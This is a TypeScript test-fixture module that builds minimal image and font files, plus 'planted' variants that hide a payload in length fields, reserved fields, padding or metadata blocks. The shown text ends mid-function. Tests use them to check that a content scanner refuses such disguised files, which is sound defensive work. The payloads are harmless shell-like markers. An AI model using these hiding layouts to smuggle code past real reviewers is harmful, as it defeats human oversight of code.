// Minimal, well-formed image and font files for the units tests: each is laid out end to end as
// its format, so a test can show what the engine exempts and, by changing a byte, what it does not.
// `planted` builds the opposite: a format's header whose length fields cover bytes of any kind, a
// structure the format does not define (or the walk does not read) holding them, and, for each check
// of a walk, a layout that fails that check alone. test/content-guards.test.ts takes each check of
// src/units/content.ts out in turn and shows that one of these then passes (or that the walk throws
// or never ends on one), except for the checks it lists as changing nothing, each with the reason.

import { brotliCompressSync, crc32, deflateSync } from "node:zlib";

function u16be(value: number): Buffer {
  const out = Buffer.alloc(2);
  out.writeUInt16BE(value);
  return out;
}

function u32be(value: number): Buffer {
  const out = Buffer.alloc(4);
  out.writeUInt32BE(value);
  return out;
}

function u16le(value: number): Buffer {
  const out = Buffer.alloc(2);
  out.writeUInt16LE(value);
  return out;
}

function u32le(value: number): Buffer {
  const out = Buffer.alloc(4);
  out.writeUInt32LE(value);
  return out;
}

function padded(data: Buffer): Buffer {
  return Buffer.concat([data, Buffer.alloc((4 - (data.length % 4)) % 4)]);
}

export function pngChunk(type: string, data: Buffer): Buffer {
  const body = Buffer.concat([Buffer.from(type, "latin1"), data]);
  return Buffer.concat([u32be(data.length), body, u32be(crc32(body))]);
}

/** A 1x1 greyscale PNG: signature, IHDR, IDAT, IEND (with `extra` chunks before IEND). */
export function png(extra: Buffer[] = []): Buffer {
  const ihdr = Buffer.concat([u32be(1), u32be(1), Buffer.from([8, 0, 0, 0, 0])]);
  return Buffer.concat([
    Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]),
    pngChunk("IHDR", ihdr),
    pngChunk("IDAT", deflateSync(Buffer.from([0, 0]))),
    ...extra,
    pngChunk("IEND", Buffer.alloc(0)),
  ]);
}

/** A JPEG marker segment: the marker, its length and `data`. */
export function jpegSegment(marker: number, data: Buffer): Buffer {
  return Buffer.concat([Buffer.from([0xff, marker]), u16be(2 + data.length), data]);
}

/** A JPEG's segments: SOI, APP0 (then `extra` segments), SOF0, SOS with entropy-coded data (a stuffed 0xFF and a restart), EOI. */
export function jpeg(extra: Buffer[] = []): Buffer {
  const app0 = Buffer.concat([Buffer.from([0xff, 0xe0]), u16be(16), Buffer.from("JFIF\0", "latin1"), Buffer.from([1, 1, 0, 0, 1, 0, 1, 0, 0])]);
  const sof0 = Buffer.concat([Buffer.from([0xff, 0xc0]), u16be(11), Buffer.from([8, 0, 1, 0, 1, 1, 1, 0x11, 0])]);
  const sos = Buffer.concat([Buffer.from([0xff, 0xda]), u16be(8), Buffer.from([1, 1, 0, 0, 63, 0])]);
  const data = Buffer.from([0x12, 0x34, 0xff, 0x00, 0x56, 0xff, 0xd0, 0x78]);
  return Buffer.concat([Buffer.from([0xff, 0xd8]), app0, ...extra, sof0, sos, data, Buffer.from([0xff, 0xd9])]);
}

/** A GIF extension: its label, then `data` as sub-blocks of at most 255 bytes and the zero block. */
export function gifExtension(label: number, data: Buffer): Buffer {
  const blocks: Buffer[] = [];
  for (let at = 0; at < data.length; at += 255) {
    const part = data.subarray(at, at + 255);
    blocks.push(Buffer.from([part.length]), part);
  }
  return Buffer.concat([Buffer.from([0x21, label]), ...blocks, Buffer.from([0])]);
}

/** A 1x1 GIF89a: screen descriptor, a two-colour table, a graphic control extension, one image, `extra` blocks, the trailer. */
export function gif(extra: Buffer[] = []): Buffer {
  return Buffer.concat([
    Buffer.from("GIF89a", "latin1"),
    Buffer.from([1, 0, 1, 0, 0x80, 0, 0]),
    Buffer.from([0, 0, 0, 0xff, 0xff, 0xff]),
    Buffer.from([0x21, 0xf9, 4, 0, 0, 0, 0, 0]),
    Buffer.from([0x2c, 0, 0, 0, 0, 1, 0, 1, 0, 0]),
    Buffer.from([2, 2, 0x44, 0x01, 0]),
    ...extra,
    Buffer.from([0x3b]),
  ]);
}

/** A RIFF chunk: its type, its size, `data`, and a zero pad byte when the size is odd. */
export function riffChunk(type: string, data: Buffer): Buffer {
  return Buffer.concat([Buffer.from(type, "latin1"), u32le(data.length), data, Buffer.alloc(data.length % 2)]);
}

/** A lossless WebP: RIFF, its size, WEBP, one VP8L chunk (odd, so padded), then `extra` chunks. */
export function webp(extra: Buffer[] = []): Buffer {
  const chunks = Buffer.concat([riffChunk("VP8L", Buffer.from([0x2f, 0, 0, 0, 0])), ...extra]);
  return Buffer.concat([Buffer.from("RIFF", "latin1"), u32le(4 + chunks.length), Buffer.from("WEBP", "latin1"), chunks]);
}

export function box(type: string, data: Buffer): Buffer {
  return Buffer.concat([u32be(8 + data.length), Buffer.from(type, "latin1"), data]);
}

/** An ISOBMFF full box: version, `flags`, then `data`. */
export function fullBox(type: string, version: number, data: Buffer, flags = 0): Buffer {
  return box(type, Buffer.concat([Buffer.from([version, (flags >> 16) & 0xff, (flags >> 8) & 0xff, flags & 0xff]), data]));
}

/** An AVIF item's infe entry (version 2): its ID, its protection index (0: none), its type and its NUL-terminated strings. */
export function infe(id: number, type: string, strings = "\0", flags = 0, protection = 0): Buffer {
  return fullBox("infe", 2, Buffer.concat([u16be(id), u16be(protection), Buffer.from(type, "latin1"), Buffer.from(strings, "latin1")]), flags);
}

/** An item reference of an iref box (version 0): its type, from item `from` to `to`. */
export function itemReference(type: string, from: number, to: readonly number[]): Buffer {
  return box(type, Buffer.concat([u16be(from), u16be(to.length), ...to.map((id) => u16be(id))]));
}

/** What `avif` adds to or puts in place of its default boxes. */
export interface AvifExtra {
  /** infe entries after the first item's. */
  readonly items?: Buffer[];
  /** Item properties after ispe. */
  readonly properties?: Buffer[];
  /** Boxes at the end of meta. */
  readonly meta?: Buffer[];
  /** hdlr's name. */
  readonly name?: Buffer;
  /** ftyp's body (brands), in place of avif, 0, avif, mif1. */
  readonly ftyp?: Buffer;
  /** hdlr's body after its version and flags, in place of pre_defined, pict, the reserved words and the name. */
  readonly hdlr?: Buffer;
  /** pitm's body after its version and flags, in place of the primary item's ID. */
  readonly pitm?: Buffer;
  /** Bytes after iloc's last item. */
  readonly ilocTail?: Buffer;
  /** Boxes in iprp after its ipma. */
  readonly ipma?: Buffer[];
  /** The first item's extents, each an offset into the data and a length, in place of one extent over all of it. */
  readonly extents?: ReadonlyArray<readonly [number, number]>;
  /** The whole ftyp box, in place of the default. */
  readonly ftypBox?: Buffer;
  /** The whole iinf box, in place of the default. */
  readonly iinf?: Buffer;
  /** The ipma box, in place of the default (item 1 with ispe). */
  readonly ipmaBox?: Buffer;
  /** The whole iprp box, in place of the default. */
  readonly iprp?: Buffer;
  /** The whole iloc box for item data starting at `offset` (mdat's body), in place of the default. */
  readonly iloc?: (offset: number) => Buffer;
  /** meta's children (hdlr, pitm, iloc, iinf, iprp, then `meta`), reordered, dropped or replaced. */
  readonly children?: (boxes: Buffer[]) => Buffer[];
}

/**
 * An AVIF still image: ftyp (avif, compatible mif1), meta (hdlr pict, pitm, iloc, iinf with one
 * av01 item, iprp with ispe), and mdat holding the item's data, which iloc's one extent covers.
 * `extra` adds to or replaces parts of it (AvifExtra).
 */
export function avif(data: Buffer = Buffer.from([0x12, 0x00, 0x0a, 0x0b]), extra: AvifExtra = {}): Buffer {
  const ftyp = extra.ftypBox ?? box("ftyp", extra.ftyp ?? Buffer.from("avif\0\0\0\0avifmif1", "latin1"));
  const hdlr = fullBox("hdlr", 0, extra.hdlr ?? Buffer.concat([u32be(0), Buffer.from("pict", "latin1"), Buffer.alloc(12), extra.name ?? Buffer.from("Picture\0", "latin1")]));
  const pitm = fullBox("pitm", 0, extra.pitm ?? u16be(1));
  const items = [infe(1, "av01", "Color\0"), ...(extra.items ?? [])];
  const iinf = extra.iinf ?? fullBox("iinf", 0, Buffer.concat([u16be(items.length), ...items]));
  const ipco = box("ipco", Buffer.concat([fullBox("ispe", 0, Buffer.concat([u32be(1), u32be(1)])), ...(extra.properties ?? [])]));
  const ipma = extra.ipmaBox ?? fullBox("ipma", 0, Buffer.concat([u32be(1), u16be(1), Buffer.from([1, 0x81])]));
  const iprp = extra.iprp ?? box("iprp", Buffer.concat([ipco, ipma, ...(extra.ipma ?? [])]));
  // iloc version 0: four-byte offsets and lengths, no base offset; item 1, one extent (or `extents`).
  const extents = extra.extents ?? [[0, data.length]];
  const iloc =
    extra.iloc ??
    ((offset: number): Buffer =>
      fullBox(
        "iloc",
        0,
        Buffer.concat([u16be(0x4400), u16be(1), u16be(1), u16be(0), u16be(extents.length), ...extents.map(([at, length]) => Buffer.concat([u32be((offset + at) >>> 0), u32be(length)])), extra.ilocTail ?? Buffer.alloc(0)]),
      ));
  const children = extra.children ?? ((boxes: Buffer[]): Buffer[] => boxes);
  const meta = (offset: number): Buffer => fullBox("meta", 0, Buffer.concat(children([hdlr, pitm, iloc(offset), iinf, iprp, ...(extra.meta ?? [])])));
  const before = ftyp.length + meta(0).length;
  return Buffer.concat([ftyp, meta(before + 8), box("mdat", data)]);
}

/** A 1x1 24-bit BMP: file header, BITMAPINFOHEADER, one padded row. */
export function bmp(): Buffer {
  const info = Buffer.alloc(40);
  info.writeUInt32LE(40, 0);
  info.writeInt32LE(1, 4);
  info.writeInt32LE(1, 8);
  info.writeUInt16LE(1, 12);
  info.writeUInt16LE(24, 14);
  const pixels = Buffer.from([0, 0, 0xff, 0]);
  const header = Buffer.concat([Buffer.from("BM", "latin1"), u32le(14 + 40 + pixels.length), Buffer.alloc(4), u32le(54)]);
  return Buffer.concat([header, info, pixels]);
}

/** A 3x2 8-bit BMP with a four-colour palette: rows of 3 bytes, each padded to 4. */
export function bmp8(): Buffer {
  const info = Buffer.alloc(40);
  info.writeUInt32LE(40, 0);
  info.writeInt32LE(3, 4);
  info.writeInt32LE(2, 8);
  info.writeUInt16LE(1, 12);
  info.writeUInt16LE(8, 14);
  info.writeUInt32LE(4, 32);
  const palette = Buffer.from([0, 0, 0, 0, 0xff, 0xff, 0xff, 0, 0, 0, 0xff, 0, 0, 0xff, 0, 0]);
  const pixels = Buffer.from([0, 1, 2, 0, 3, 2, 1, 0]);
  const offset = 14 + 40 + palette.length;
  const header = Buffer.concat([Buffer.from("BM", "latin1"), u32le(offset + pixels.length), Buffer.alloc(4), u32le(offset)]);
  return Buffer.concat([header, info, palette, pixels]);
}

/** A 1x1 32-bit bitmap as an ICO holds it: no file header, the height doubled, the colour row, then the mask row. */
export function icoBitmap(): Buffer {
  const info = Buffer.alloc(40);
  info.writeUInt32LE(40, 0);
  info.writeInt32LE(1, 4);
  info.writeInt32LE(2, 8);
  info.writeUInt16LE(1, 12);
  info.writeUInt16LE(32, 14);
  return Buffer.concat([info, Buffer.from([0x10, 0x20, 0x30, 0xff]), Buffer.alloc(4)]);
}

/** An ICO holding `images` (default: one PNG), one after another past the directory. */
export function ico(images: Buffer[] = [png()]): Buffer {
  const directory = 6 + 16 * images.length;
  const entries: Buffer[] = [];
  let offset = directory;
  for (const image of images) {
    entries.push(Buffer.concat([Buffer.from([1, 1, 0, 0, 1, 0, 32, 0]), u32le(image.length), u32le(offset)]));
    offset += image.length;
  }
  return Buffer.concat([Buffer.from([0, 0, 1, 0, images.length, 0]), ...entries, ...images]);
}

/** A font's head table: 54 bytes, version 1.0 and its magic number. */
export function headTable(): Buffer {
  const head = Buffer.alloc(54);
  head.writeUInt32BE(0x00010000, 0);
  head.writeUInt32BE(0x5f0f3cf5, 12);
  return head;
}

/** A TrueType font with one table, head, carrying its magic number. */
export function ttf(): Buffer {
  const head = headTable();
  const directory = Buffer.concat([u32be(0x00010000), u16be(1), u16be(16), u16be(0), u16be(0), Buffer.from("head", "latin1"), u32be(0), u32be(28), u32be(head.length)]);
  return Buffer.concat([directory, padded(head)]);
}

/**
 * A WOFF with one table, head, stored as it is or zlib-compressed (or as `table`'s bytes), and
 * optionally an extended metadata block (zlib-compressed XML) and a private block, each on a
 * four-byte boundary.
 */
export function woff(options: { compressed?: boolean; table?: Buffer; metadata?: string; private?: Buffer } = {}): Buffer {
  const head = headTable();
  const table = options.table ?? (options.compressed === true ? deflateSync(head, { level: 9 }) : head);
  const header = Buffer.alloc(44);
  header.write("wOFF", 0, "latin1");
  header.writeUInt32BE(0x00010000, 4);
  header.writeUInt16BE(1, 12);
  header.writeUInt32BE(12 + 16 + 56, 16);
  const blocks: Buffer[] = [padded(table)];
  let at = 64 + padded(table).length;
  if (options.metadata !== undefined) {
    const metadata = deflateSync(Buffer.from(options.metadata, "utf8"));
    header.writeUInt32BE(at, 24);
    header.writeUInt32BE(metadata.length, 28);
    header.writeUInt32BE(Buffer.byteLength(options.metadata, "utf8"), 32);
    blocks.push(padded(metadata));
    at += padded(metadata).length;
  }
  if (options.private !== undefined) {
    header.writeUInt32BE(at, 36);
    header.writeUInt32BE(options.private.length, 40);
    blocks.push(options.private);
    at += options.private.length;
  }
  header.writeUInt32BE(at, 8);
  const entry = Buffer.concat([Buffer.from("head", "latin1"), u32be(64), u32be(table.length), u32be(head.length), u32be(0)]);
  return Buffer.concat([header, entry, ...blocks]);
}

/**
 * A WOFF2 with one known table, head (with its magic), as one brotli stream (or `stream`, which must
 * decompress to the head table), and optionally a metadata block (`block`, said to decompress to
 * `original` bytes) and a private block, each on a four-byte boundary.
 */
export function woff2(options: { stream?: Buffer; metadata?: { block: Buffer; original: number }; private?: Buffer } = {}): Buffer {
  const stream = options.stream ?? brotliCompressSync(headTable());
  const header = Buffer.alloc(48);
  header.write("wOF2", 0, "latin1");
  header.writeUInt32BE(0x00010000, 4);
  header.writeUInt16BE(1, 12);
  header.writeUInt32BE(12 + 16 + 56, 16);
  header.writeUInt32BE(stream.length, 20);
  let body: Buffer = Buffer.concat([Buffer.from([0x01, 54]), stream]);
  if (options.metadata !== undefined) {
    body = padded(body);
    header.writeUInt32BE(48 + body.length, 28);
    header.writeUInt32BE(options.metadata.block.length, 32);
    header.writeUInt32BE(options.metadata.original, 36);
    body = Buffer.concat([body, options.metadata.block]);
  }
  if (options.private !== undefined) {
    body = padded(body);
    header.writeUInt32BE(48 + body.length, 40);
    header.writeUInt32BE(options.private.length, 44);
    body = Buffer.concat([body, options.private]);
  }
  header.writeUInt32BE(48 + body.length, 8);
  return Buffer.concat([header, body]);
}

/**
 * A brotli stream (RFC 7932) that decodes to `data`: a metadata meta-block holding `metadata` (which
 * decodes to nothing), then `data` as one uncompressed meta-block, then the empty last meta-block.
 */
export function brotliWithMetadata(metadata: Buffer, data: Buffer): Buffer {
  const out: number[] = [];
  let byte = 0;
  let bits = 0;
  const put = (value: number, width: number): void => {
    for (let i = 0; i < width; i++) {
      byte |= ((value >>> i) & 1) << bits;
      if (++bits === 8) {
        out.push(byte);
        byte = 0;
        bits = 0;
      }
    }
  };
  const align = (): void => {
    if (bits > 0) put(0, 8 - bits);
  };
  const skip = metadata.length - 1;
  const skipBytes = skip < 0x100 ? 1 : skip < 0x10000 ? 2 : 3;
  // WBITS 16; ISLAST 0; MNIBBLES 0 (a metadata block), its reserved bit, MSKIPBYTES, MSKIPLEN - 1.
  put(0, 1);
  put(0, 1);
  put(3, 2);
  put(0, 1);
  put(skipBytes, 2);
  put(skip, 8 * skipBytes);
  align();
  out.push(...metadata);
  // ISLAST 0; MNIBBLES 4, MLEN - 1; ISUNCOMPRESSED; the data. Then ISLAST and ISLASTEMPTY.
  put(0, 1);
  put(0, 2);
  put(data.length - 1, 16);
  put(1, 1);
  align();
  out.push(...data);
  put(1, 1);
  put(1, 1);
  align();
  return Buffer.from(out);
}

/**
 * An EOT with a TrueType font as its data, plain or XOR-obfuscated: version 1.0 with four names
 * (empty unless `names` gives them), or version 2.2 (`v22`) with a root string, a signature and EUDC
 * font data (each empty unless given).
 */
export function eot(options: { xor?: boolean; names?: Buffer[]; v22?: { root?: Buffer; signature?: Buffer; eudc?: Buffer } } = {}): Buffer {
  const font = options.xor === true ? Buffer.from(ttf().map((byte) => byte ^ 0x50)) : ttf();
  const field = (data: Buffer = Buffer.alloc(0)): Buffer => Buffer.concat([u16le(0), u16le(data.length), data]);
  const parts = [0, 1, 2, 3].map((index) => field(options.names?.[index]));
  const v22 = options.v22;
  if (v22 !== undefined) {
    const eudc = v22.eudc ?? Buffer.alloc(0);
    parts.push(field(v22.root), Buffer.alloc(8), field(v22.signature), u32le(eudc.length === 0 ? 0 : 1), u32le(eudc.length), eudc);
  }
  const header = Buffer.alloc(80);
  const names = Buffer.concat(parts);
  header.writeUInt32LE(header.length + names.length + font.length, 0);
  header.writeUInt32LE(font.length, 4);
  header.writeUInt32LE(v22 === undefined ? 0x00010000 : 0x00020002, 8);
  if (options.xor === true) header.writeUInt32LE(0x10000000, 12);
  header.writeUInt16LE(0x504c, 34);
  return Buffer.concat([header, names, font]);
}

/** A name an exempt font has (and an image does not). */
export const FONT_NAME_RE = /\.(?:ttf|otf|woff2?|eot)$/;

/**
 * Images and fonts laid out as real ones are, each exempt under its name: one of each format at its
 * smallest, and the layouts encoders write (padding, compression, obfuscation, names, palettes, an
 * alpha item with its references, every property type an AVIF walk knows, comments and metadata),
 * and each other layout the walks accept (a WOFF2 head table named by its tag).
 */
export function exemptShapes(): Record<string, Buffer> {
  // Some writers pad a bitmap with zero bytes after its last row.
  const paddedBmp = Buffer.concat([bmp(), Buffer.alloc(2)]);
  paddedBmp.writeUInt32LE(paddedBmp.length, 2);
  const u32 = (...values: number[]): Buffer => Buffer.concat(values.map((value) => u32be(value)));
  const utf16 = (text: string): Buffer => Buffer.from(text, "utf16le");
  return {
    "a.png": png(),
    "a.jpg": jpeg(),
    "a.jpeg": jpeg(),
    "a.gif": gif(),
    "a.webp": webp(),
    "a.avif": avif(),
    "a.ico": ico(),
    "a.bmp": bmp(),
    "a.ttf": ttf(),
    "a.otf": ttf(),
    "a.woff": woff(),
    "a.woff2": woff2(),
    "a.eot": eot(),
    "padded.bmp": paddedBmp,
    "padded.ico": ico([Buffer.concat([icoBitmap(), Buffer.alloc(28)])]),
    "compressed.woff": woff({ compressed: true, metadata: '<?xml version="1.0"?><metadata version="1.0"/>' }),
    "obfuscated.eot": eot({ xor: true }),
    "named.eot": eot({ names: [utf16("Example Sans"), utf16("Regular"), utf16("Version 1.000;PS 1.0;hotconv 1.0.88"), utf16("Example Sans Regular")] }),
    "v22.eot": eot({ v22: { root: utf16("https://example.org/\0") } }),
    "palette.bmp": bmp8(),
    "both.ico": ico([icoBitmap(), png()]),
    "larger.avif": avif(Buffer.alloc(300, 7)),
    // An alpha item, its auxiliary type and reference, a data reference, and metadata items, as encoders write them.
    "alpha.avif": avif(undefined, {
      items: [infe(2, "av01", "Alpha\0", 1), infe(3, "Exif", "\0"), infe(4, "mime", "XMP\0application/rdf+xml\0")],
      properties: [
        box("av1C", Buffer.from([0x81, 0x00, 0x0c, 0x00, 0x0a, 0x0b, 0x00, 0x00, 0x00, 0x2d, 0x4c, 0xff, 0xb3, 0xdf, 0xff, 0x98, 0x04])),
        fullBox("auxC", 0, Buffer.from("urn:mpeg:mpegB:cicp:systems:auxiliary:alpha\0", "latin1")),
        fullBox("pixi", 0, Buffer.from([1, 8])),
      ],
      meta: [
        fullBox("iref", 0, Buffer.concat([itemReference("auxl", 2, [1]), itemReference("cdsc", 3, [1]), itemReference("cdsc", 4, [1])])),
        box("dinf", fullBox("dref", 0, Buffer.concat([u32(1), fullBox("url ", 0, Buffer.alloc(0), 1)]))),
        box("grpl", fullBox("altr", 0, u32(5, 2, 1, 2))),
      ],
    }),
    // Every other property type the walk knows, a colour profile among them.
    "properties.avif": avif(undefined, {
      properties: [
        box("colr", Buffer.concat([Buffer.from("nclx", "latin1"), Buffer.from([0, 1, 0, 13, 0, 6, 0x80])])),
        box("colr", Buffer.concat([Buffer.from("prof", "latin1"), iccHeader(132)])),
        box("pasp", u32(1, 1)),
        box("clap", u32(1, 1, 1, 1, 0, 1, 0, 1)),
        box("irot", Buffer.from([1])),
        box("imir", Buffer.from([0])),
        box("lsel", Buffer.from([0, 0])),
        box("a1op", Buffer.from([0])),
        box("a1lx", Buffer.from([0, 0, 1, 0, 2, 0, 3])),
        box("clli", Buffer.from([0, 100, 0, 50])),
        box("mdcv", Buffer.alloc(24, 1)),
      ],
    }),
    // A WOFF2 that names its head table by tag rather than by its index, which the walk reads too.
    "head-tag.woff2": woff2Of(1, Buffer.concat([Buffer.from([0x3f]), Buffer.from("head", "latin1"), Buffer.from([54])]), headTable()),
    "comment.gif": gif([gifExtension(0xfe, Buffer.from("made by hand"))]),
    "comment.jpg": jpeg([jpegSegment(0xfe, Buffer.from("made by hand"))]),
    "exif.webp": webp([riffChunk("EXIF", Buffer.from("Exif\0\0MM\0*"))]),
    // Two items, each in its own mdat.
    "two-mdat.avif": Buffer.concat([
      avif(Buffer.from([1, 2, 3, 4]), {
        items: [infe(2, "av01", "Alpha\0")],
        iloc: (offset) => fullBox("iloc", 0, Buffer.concat([u16be(0x4400), u16be(2), u16be(1), u16be(0), u16be(1), u32be(offset), u32be(4), u16be(2), u16be(0), u16be(1), u32be(offset + 12), u32be(4)])),
      }),
      box("mdat", Buffer.from([5, 6, 7, 8])),
    ]),
    // The other versions and layouts each walk reads, so a condition that only picks how to read one
    // (a field's width, a table that may be there) cannot be taken the wrong way with every test green:
    // a GIF image with its own colour table, and fill bytes before a restart marker in a JPEG scan.
    "local-table.gif": Buffer.concat([
      Buffer.from("GIF89a", "latin1"),
      Buffer.from([1, 0, 1, 0, 0x80, 0, 0, 0, 0, 0, 0xff, 0xff, 0xff]),
      Buffer.from([0x2c, 0, 0, 0, 0, 1, 0, 1, 0, 0x80, 0, 0, 0, 0xff, 0, 0]),
      Buffer.from([2, 2, 0x44, 0x01, 0, 0x3b]),
    ]),
    "fill.jpg": Buffer.concat([jpeg().subarray(0, 43), Buffer.from([0x12, 0xff, 0xff, 0xd0, 0x34]), jpeg().subarray(51)]),
    // AVIF: item references and items with four-byte IDs (iref version 1, iinf version 1 with an infe
    // of version 3), an item's data in idat (iloc version 1, construction method 1), and iloc version 2.
    "iref-v1.avif": avif(undefined, { items: [infe(2, "Exif", "\0")], meta: [fullBox("iref", 1, box("cdsc", Buffer.concat([u32be(2), u16be(1), u32be(1)])))] }),
    "iinf-v1.avif": avif(undefined, { iinf: fullBox("iinf", 1, Buffer.concat([u32be(1), fullBox("infe", 3, Buffer.concat([u32be(1), u16be(0), Buffer.from("av01Color\0", "latin1")]))])) }),
    "idat-item.avif": avif(Buffer.alloc(0), {
      meta: [box("idat", Buffer.from([1, 2, 3, 4]))],
      iloc: () => fullBox("iloc", 1, Buffer.concat([u16be(0x4400), u16be(1), u16be(1), u16be(1), u16be(0), u16be(1), u32be(0), u32be(4)])),
    }),
    "iloc-v2.avif": avif(undefined, { iloc: (offset) => fullBox("iloc", 2, Buffer.concat([u16be(0x4400), u32be(1), u32be(1), u16be(0), u16be(0), u16be(1), u32be(offset), u32be(4)])) }),
    // Bitmaps: an OS/2 core header (12 bytes, 16-bit sizes, three-byte palette entries), a full palette
    // (a colour count of 0), and colour masks after a 40-byte header or inside a V5 header.
    "core.bmp": (() => {
      const core = Buffer.concat([u32le(12), u16le(1), u16le(1), u16le(1), u16le(1)]);
      const palette = Buffer.from([0, 0, 0, 0xff, 0xff, 0xff]);
      const rows = Buffer.from([0x80, 0, 0, 0]);
      return Buffer.concat([Buffer.from("BM", "latin1"), u32le(14 + core.length + palette.length + rows.length), Buffer.alloc(4), u32le(14 + core.length + palette.length), core, palette, rows]);
    })(),
    "palette-full.bmp": bmpOf({ bits: 1, palette: Buffer.from([0, 0, 0, 0, 0xff, 0xff, 0xff, 0]), rows: Buffer.from([0x80, 0, 0, 0]) }),
    "bitfields.bmp": bmpOf({ bits: 32, compression: 3, masks: Buffer.concat([u32le(0xff0000), u32le(0xff00), u32le(0xff)]), rows: Buffer.from([1, 2, 3, 0]) }),
    "bitfields-v5.bmp": bmpOf({ headerSize: 124, bits: 32, compression: 3, rows: Buffer.from([1, 2, 3, 0]) }),
    // WOFF2: glyf and loca transformed (version 0; loca's transformed length is 0), and hmtx transformed (version 1).
    "glyf-loca-transformed.woff2": woff2Of(3, Buffer.from([0x01, 54, 0x0a, 8, 8, 0x0b, 4, 0]), Buffer.concat([headTable(), Buffer.alloc(8, 1)])),
    "hmtx-transformed.woff2": woff2Of(2, Buffer.from([0x01, 54, 0x43, 4, 4]), Buffer.concat([headTable(), Buffer.alloc(4, 1)])),
  };
}

/**
 * Files laid out as their format that the inventory reads as text (all valid UTF-8, no NUL in the
 * first 8,000 bytes), so they are reviewed as text and never exempt: a GIF whose descriptors are
 * printable and whose image data is sub-blocks of 126 bytes of a script (each size byte a `~`), its
 * first NUL, the end of the sub-blocks, past byte 8,000.
 */
export function textShaped(): Record<string, Buffer> {
  const line = repeated("echo MARKER-PAYLOAD; ", 126);
  const blocks = Array.from({ length: 70 }, () => Buffer.concat([Buffer.from([126]), line]));
  const textGif = Buffer.concat([Buffer.from("GIF89aAAAA   ,AAAAAAAA \x08", "latin1"), ...blocks, Buffer.from([0, 0x3b])]);
  return { "text.gif": textGif };
}

/** `text` repeated to exactly `length` bytes: printable ASCII when `text` is. */
function repeated(text: string, length: number): Buffer {
  return Buffer.from(text.repeat(Math.ceil(length / text.length)).slice(0, length), "latin1");
}

/**
 * For each format whose walk once left bytes unread, a header whose length fields cover `payload`,
 * or a structure the format does not define (or the walk does not read) holding it: each starts as
 * an image or a font, and none is one. Then one shape for each other check of the walks
 * (`perGuard`, `perCondition` and `perField`): each is refused by the check its name says, so a test
 * over these fails when any one check is taken out (test/content-guards.test.ts runs that, check by
 * check). `perField`'s shapes each come with a twin, the same layout with that one field restored,
 * which is exempt (`twins`), so none of them can stand in for a check by failing two.
 */
export function planted(payload: Buffer): Record<string, Buffer> {
  const fields = Object.entries(perField()).map(([name, [shape]]): [string, Buffer] => [name, shape]);
  return { ...plantedLayouts(payload), ...perGuard(payload), ...perCondition(), ...Object.fromEntries(fields) };
}

/** The names of the shapes of `planted` that each stand for one check of a walk (`perCondition` and `perField`). */
export function oneCheckShapes(): string[] {
  return [...Object.keys(perCondition()), ...Object.keys(perField())];
}

/** Each shape of `perField` by name, with that one field restored: an image or a font, exempt under its name. */
export function twins(): Record<string, Buffer> {
  return Object.fromEntries(Object.entries(perField()).map(([name, [, twin]]): [string, Buffer] => [name, twin]));
}

/** An ICC profile's header (132 bytes): `size` as its size field, and `signature` at 36 (acsp in a real one). */
function iccHeader(size: number, signature = "acsp"): Buffer {
  const icc = Buffer.alloc(132);
  icc.writeUInt32BE(size, 0);
  icc.write(signature, 36, "latin1");
  return icc;
}

/**
 * One shape for each check of the walks that no layout above reaches alone: `payload` (or a long
 * run of it, or long printable text) past each size or bound a walk sets (an AVIF property, string,
 * ftyp, hdlr, pitm, iloc or ipma; an EOT name or root string; a PNG IHDR or IEND), in each gap it
 * requires to be zero, and each type, flag, reserved field, count, marker or compressed stream it
 * refuses. Each is refused by that one check only: with that check taken out of content.ts, it
 * passes as an image or a font.
 */
function perGuard(payload: Buffer): Record<string, Buffer> {
  const long = Buffer.concat(Array.from({ length: Math.ceil(300 / payload.length) }, () => payload));
  const script = "#!/bin/sh echo MARKER-PAYLOAD; ";
  const property = (name: string, bytes: Buffer): [string, Buffer] => [`property-${name}.avif`, avif(undefined, { properties: [bytes] })];
  const u32s = (...values: number[]): Buffer => Buffer.concat(values.map((value) => u32be(value)));
  const alpha = Buffer.from("urn:mpeg:mpegB:cicp:systems:auxiliary:alpha\0", "latin1");
  const dref = (count: number, entries: Buffer[]): Buffer => fullBox("dref", 0, Buffer.concat([u32be(count), ...entries]));
  const selfContained = fullBox("url ", 0, Buffer.alloc(0), 1);
  // EOT: the header's reserved words, a name's padding, and a version 2.2 EOT's EUDC fields.
  const reservedEot = eot();
  payload.copy(reservedEot, 64, 0, Math.min(16, payload.length));
  reservedEot.writeUInt16LE(0x2123, 64);
  const paddingEot = eot();
  paddingEot.writeUInt16LE(0x2123, 80);
  const eudcEot = eot({ v22: {} });
  eudcEot.writeUInt32LE(0x6e69622f, 112);
  eudcEot.writeUInt32LE(0x0a68732f, 116);
  // EOT: plain font data flagged as compressed with MicroType Express, which the walk does not read.
  const mtxEot = eot();
  mtxEot.writeUInt32LE(0x4, 12);
  // WOFF and WOFF2: a private block lying over the font's own bytes, and the reserved field set.
  const privateWoff = woff();
  privateWoff.writeUInt32BE(64, 36);
  privateWoff.writeUInt32BE(4, 40);
  const privateWoff2 = woff2();
  privateWoff2.writeUInt32BE(48, 40);
  privateWoff2.writeUInt32BE(2, 44);
  const reservedWoff = woff();
  reservedWoff.writeUInt16BE(1, 14);
  const reservedWoff2 = woff2();
  reservedWoff2.writeUInt16BE(1, 14);
  // An ICO entry's reserved byte; an iinf box that says it holds one more item than it does.
  const reservedIco = ico();
  reservedIco[9] = 1;
  const iinfCount = avif();
  iinfCount.writeUInt16BE(2, iinfCount.indexOf("iinf", 0, "latin1") + 8);
  // A version 5 bitmap that embeds a colour profile (with no profile data at all).
  const v5 = Buffer.alloc(124);
  v5.writeUInt32LE(124, 0);
  v5.writeInt32LE(1, 4);
  v5.writeInt32LE(1, 8);
  v5.writeUInt16LE(1, 12);
  v5.writeUInt16LE(24, 14);
  v5.writeUInt32LE(0x4d424544, 56);
  const profileBmp = Buffer.concat([Buffer.from("BM", "latin1"), u32le(14 + 124 + 4), Buffer.alloc(4), u32le(14 + 124), v5, Buffer.from([0, 0, 0xff, 0])]);
  // PNG: IHDR longer than its 13 bytes, a second IHDR, and an IEND that holds data.
  const image = png();
  const longIhdr = Buffer.concat([image.subarray(0, 8), pngChunk("IHDR", Buffer.concat([image.subarray(16, 29), payload])), image.subarray(33)]);
  const iendData = Buffer.concat([image.subarray(0, image.length - 12), pngChunk("IEND", payload)]);
  // WebP: an odd chunk whose pad byte is not zero.
  const oddChunk = riffChunk("EXIF", Buffer.from("Exif\0\0MM\0*\0", "latin1"));
